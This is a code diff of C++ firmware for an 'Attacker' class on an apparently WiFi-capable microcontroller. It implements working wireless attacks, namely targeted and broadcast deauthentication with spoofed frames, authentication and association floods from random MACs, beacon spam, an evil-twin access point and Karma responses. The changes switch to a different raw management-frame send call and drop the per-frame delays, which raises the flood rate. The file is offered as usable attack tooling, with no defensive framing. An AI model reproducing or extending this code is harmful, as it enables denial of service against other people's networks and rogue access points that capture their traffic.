@@ -3,11 +3,7 @@
 #include "scanner.h"
 #include "../log.h"
 #include <WiFi.h>
-
-extern "C" {
-    int wifi_tx_raw_frame(void* frame, int len);
-    int wifi_change_channel(int channel);
-}
+#include "wifi_conf.h"
 
 static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 
@@ -19,9 +15,10 @@ void Attacker::init() {
     memset(&_stats, 0, sizeof(_stats));
 }
 
-void Attacker::setFrames(uint8_t f) { _frames = f; }
-void Attacker::setDelay(uint8_t d)  { _delay_ms = d; }
-void Attacker::setReason(uint16_t r){ _reason = r; }
+void Attacker::setFrames(uint8_t f)  { _frames = f; }
+void Attacker::setDelay(uint8_t d)   { _delay_ms = d; }
+void Attacker::setReason(uint16_t r) { _reason = r; }
+void Attacker::setHomeChannel(uint8_t ch) { _homeChannel = ch; }
 
 void Attacker::addTarget(const uint8_t* bssid, const uint8_t* client) {
     if (_targetCount >= MAX_NETWORKS) return;
@@ -39,7 +36,8 @@ void Attacker::addBeaconSSID(const char* ssid) {
     if (_beaconCount >= MAX_BEACON_SSIDS) return;
     strlcpy(_beaconSSIDs[_beaconCount++], ssid, 33);
 }
-void Attacker::clearBeaconSSIDs() { _beaconCount = 0; }
+void Attacker::clearBeaconSSIDs()        { _beaconCount = 0; }
+int  Attacker::beaconSSIDCount() const   { return _beaconCount; }
 void Attacker::setBeaconChannel(uint8_t ch) { _beaconChannel = ch; }
 void Attacker::setBeaconInterval(uint16_t ms) { _beaconInterval = ms; }
 
@@ -58,7 +56,9 @@ void Attacker::startAttack(AttackMode mode) {
     _lastTx = 0;
 
     if (mode == ATK_EVIL_TWIN) {
-        WiFi.apbegin(_etSSID, (char*)"", _etChannel);
+        char chStr[4];
+        snprintf(chStr, sizeof(chStr), "%d", (int)_etChannel);
+        WiFi.apbegin(_etSSID, chStr);
         _etActive = true;
         Log.log(LOG_ATTACK, "Evil twin started: SSID=%s ch=%d", _etSSID, _etChannel);
     } else {
@@ -69,9 +69,10 @@ void Attacker::startAttack(AttackMode mode) {
 void Attacker::stopAttack() {
     _running = false;
     if (_etActive) {
-        // Restore main AP — caller (main.cpp) calls startAP() after this
         _etActive = false;
     }
+    // Restore radio to AP operating channel
+    wifi_set_channel(_homeChannel);
     Log.log(LOG_ATTACK, "Attack stopped. D:%u B:%u A:%u",
             _stats.deauths_sent, _stats.beacons_sent, _stats.auth_sent);
     _mode = ATK_NONE;
@@ -82,7 +83,16 @@ AttackMode Attacker::currentMode() const { return _mode; }
 const AttackStats& Attacker::stats() const { return _stats; }
 
 bool Attacker::_txFrame(uint8_t* buf, int len) {
-    return wifi_tx_raw_frame(buf, len) == 0;
+    int ret = wext_send_mgnt(WLAN0_NAME, (char*)buf, (__u16)len, 0);
+    if (ret != 0) {
+        // Log at most once every 5 s to avoid flooding the log buffer
+        static uint32_t _lastErrLog = 0;
+        if (millis() - _lastErrLog > 5000) {
+            _lastErrLog = millis();
+            Log.log(LOG_ERROR, "wext_send_mgnt fail ret=%d", ret);
+        }
+    }
+    return ret == 0;
 }
 
 void Attacker::tick() {
@@ -108,9 +118,9 @@ void Attacker::_tickDeauth() {
     if (_targetIdx >= _targetCount) _targetIdx = 0;
     AttackTarget& t = _targets[_targetIdx++];
 
-    // Switch radio to target channel (required for 5GHz targets)
+    // Switch to target channel
     const Network* tnet = Scan.networkByBSSID(t.bssid);
-    if (tnet && tnet->channel > 0) wifi_change_channel(tnet->channel);
+    if (tnet && tnet->channel > 0) wifi_set_channel(tnet->channel);
 
     uint8_t buf[64];
     const uint8_t* da = (_mode == ATK_DEAUTH_BCAST ||
@@ -120,16 +130,18 @@ void Attacker::_tickDeauth() {
     for (uint8_t i = 0; i < _frames; i++) {
         int len = FrameBuilder::buildDeauth(buf, t.bssid, da, _reason);
         if (_txFrame(buf, len)) _stats.deauths_sent++;
-        if (_delay_ms > 0) { yield(); delay(_delay_ms); }
+        yield();
     }
-    // Bidirectional deauth: also spoof client→AP direction
+
+    // Bidirectional: also spoof client→AP direction for targeted deauth
     if (_mode == ATK_DEAUTH && memcmp(da, BCAST, 6) != 0) {
-        // SA=client, DA=AP, BSSID=AP
         int len = FrameBuilder::buildDeauth(buf, t.client, t.bssid, _reason);
-        // buildDeauth sets BSSID=SA(t.client); override to AP BSSID
-        memcpy(buf + 16, t.bssid, 6);
+        memcpy(buf + 16, t.bssid, 6); // fix BSSID field to AP
         if (_txFrame(buf, len)) _stats.deauths_sent++;
     }
+
+    // Restore to AP channel after burst
+    wifi_set_channel(_homeChannel);
 }
 
 void Attacker::_tickAuthFlood() {
@@ -138,7 +150,7 @@ void Attacker::_tickAuthFlood() {
     AttackTarget& t = _targets[_targetIdx++];
 
     const Network* tnet = Scan.networkByBSSID(t.bssid);
-    if (tnet && tnet->channel > 0) wifi_change_channel(tnet->channel);
+    if (tnet && tnet->channel > 0) wifi_set_channel(tnet->channel);
 
     uint8_t buf[64];
     for (uint8_t i = 0; i < _frames; i++) {
@@ -146,8 +158,10 @@ void Attacker::_tickAuthFlood() {
         FrameBuilder::randomMAC(spoofed);
         int len = FrameBuilder::buildAuth(buf, t.bssid, spoofed);
         if (_txFrame(buf, len)) _stats.auth_sent++;
-        if (_delay_ms > 0) delay(_delay_ms);
+        yield();
     }
+
+    wifi_set_channel(_homeChannel);
 }
 
 void Attacker::_tickAssocFlood() {
@@ -155,9 +169,8 @@ void Attacker::_tickAssocFlood() {
     if (_targetIdx >= _targetCount) _targetIdx = 0;
     AttackTarget& t = _targets[_targetIdx++];
 
-    // Find SSID for this BSSID and switch to target channel
     const Network* net = Scan.networkByBSSID(t.bssid);
-    if (net && net->channel > 0) wifi_change_channel(net->channel);
+    if (net && net->channel > 0) wifi_set_channel(net->channel);
     const char* ssid = net ? net->ssid : "";
 
     uint8_t buf[128];
@@ -166,8 +179,10 @@ void Attacker::_tickAssocFlood() {
         FrameBuilder::randomMAC(spoofed);
         int len = FrameBuilder::buildAssocReq(buf, t.bssid, spoofed, ssid);
         if (_txFrame(buf, len)) _stats.assoc_sent++;
-        if (_delay_ms > 0) delay(_delay_ms);
+        yield();
     }
+
+    wifi_set_channel(_homeChannel);
 }
 
 void Attacker::_tickBeaconSpam() {
@@ -182,11 +197,13 @@ void Attacker::_tickBeaconSpam() {
     uint8_t bssid[6];
     FrameBuilder::randomMAC(bssid);
 
-    wifi_change_channel(_beaconChannel);
+    wifi_set_channel(_beaconChannel);
 
     uint8_t buf[128];
     int len = FrameBuilder::buildBeacon(buf, bssid, ssid, _beaconChannel);
     if (_txFrame(buf, len)) _stats.beacons_sent++;
+
+    wifi_set_channel(_homeChannel);
 }
 
 void Attacker::_tickKarma() {
@@ -194,6 +211,7 @@ void Attacker::_tickKarma() {
 }
 
 void Attacker::karmaRespond(const uint8_t* da, const char* ssid) {
+    (void)da;
     if (!_running || _mode != ATK_KARMA) return;
     uint8_t ourMAC[6];
     WiFi.macAddress(ourMAC);
